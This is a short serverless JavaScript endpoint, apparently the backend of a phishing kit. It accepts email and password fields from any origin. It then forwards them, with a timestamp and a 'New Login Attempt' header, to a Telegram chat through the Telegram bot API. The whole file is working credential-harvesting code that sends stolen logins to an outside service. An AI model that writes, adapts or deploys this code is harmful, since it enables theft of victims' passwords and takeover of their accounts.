// api/lead.js
export default async function handler(req, res) {
  // Allow CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    const { email, password, message } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, error: 'Email and password required' });
    }

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ success: false, error: 'Server config missing' });
    }

    const text = `
🔐 *New Login Attempt*
📧 *Email:* ${email}
🔑 *Password:* ${password}
⏰ *Time:* ${new Date().toLocaleString()}
    `.trim();

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'Markdown'
        })
      }
    );

    const data = await response.json();

    if (!data.ok) {
      console.error('Telegram API Error:', data);
      return res.status(500).json({ success: false, error: 'Telegram failed' });
    }

    return res.status(200).json({ success: true, message: 'Sent to Telegram' });

  } catch (error) {
    console.error('Server Error:', error);
    return res.status(500).json({ success: false, error: 'Internal error' });
  }
  }
